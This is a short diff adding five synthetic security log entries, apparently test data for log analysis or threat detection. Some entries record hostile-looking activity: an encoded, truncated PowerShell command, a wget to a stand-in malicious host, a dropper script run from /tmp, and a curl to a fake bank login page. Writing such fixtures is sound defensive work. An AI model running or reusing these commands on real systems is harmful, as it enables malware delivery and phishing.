@@ -1,0 +1,5 @@
+2025-07-25T14:03:22 host=WIN-RDP-1 event=powershell user=admin cmd=powershell -enc UwB0AGEAcgB0AC0A...
+2025-07-25T14:04:13 host=WIN-RDP-2 event=login user=john result=success
+2025-07-25T14:04:55 host=LINUX-DB event=wget url=http://malicious-site.biz
+2025-07-25T14:05:33 host=MAC-DEV event=application cmd=/usr/bin/python3 /tmp/dropper.py
+2025-07-25T14:06:12 host=WIN-SQL event=curl url=https://fakebank.com/login.php
